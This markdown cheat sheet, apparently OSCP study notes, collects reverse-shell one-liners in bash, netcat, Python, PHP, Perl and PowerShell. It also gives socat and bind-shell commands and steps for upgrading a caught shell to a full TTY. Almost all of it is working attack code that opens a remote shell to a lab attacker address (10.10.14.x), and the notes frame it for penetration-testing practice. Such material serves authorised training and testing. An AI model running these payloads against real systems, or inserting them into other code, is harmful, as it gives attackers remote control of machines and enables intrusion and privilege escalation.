# Notes — Reverse Shells & Shell Upgrades

> Authorized lab/OSCP use only. Ref: sushant747 Total OSCP Guide — Spawning shells.

## Listener (attacker side)
```bash
nc -lvnp 443
rlwrap nc -lvnp 443        # arrow keys / history in the caught shell
```

## Reverse Shell One-liners (victim side)

### Bash
```bash
bash -i >& /dev/tcp/10.10.14.x/443 0>&1
```

### Netcat
```bash
nc -e /bin/sh 10.10.14.x 443
# no -e support:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.x 443 >/tmp/f
```

### Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.x",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP
```php
php -r '$s=fsockopen("10.10.14.x",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl
```perl
perl -e 'use Socket;$i="10.10.14.x";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PowerShell (Windows)
```powershell
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.14.x',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
```

## TTY / Shell Upgrade (Linux)
```bash
# 1) spawn a pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 2) background with Ctrl+Z, then on attacker:
stty raw -echo; fg
# 3) back in the shell:
export TERM=xterm
stty rows 38 columns 116      # match your terminal (check with `stty -a` locally)
```
Alternatives to spawn a pty: `script /dev/null -c bash`, `socat`.

## socat (fully interactive)
```bash
# attacker
socat file:`tty`,raw,echo=0 tcp-listen:443
# victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.x:443
```

## Bind Shell (when egress is filtered)
```bash
# victim listens
nc -lvnp 4444 -e /bin/sh
# attacker connects
nc 10.10.10.x 4444
```

## Common Mistakes
- Wrong LHOST — use the **VPN (`tun0`) IP**, not your LAN IP.
- Forgetting to start the listener before triggering the shell.
- Not upgrading to a TTY → Ctrl+C kills the shell, no tab-complete, `sudo`/`su` fail.

## OSCP Tips
- Keep a listener template ready: `rlwrap nc -lvnp 443`.
- Always upgrade to a full TTY before attempting privesc (interactive `sudo`/`su` need it).
- Have 2–3 payload languages memorized — the victim may lack `nc -e` or python.
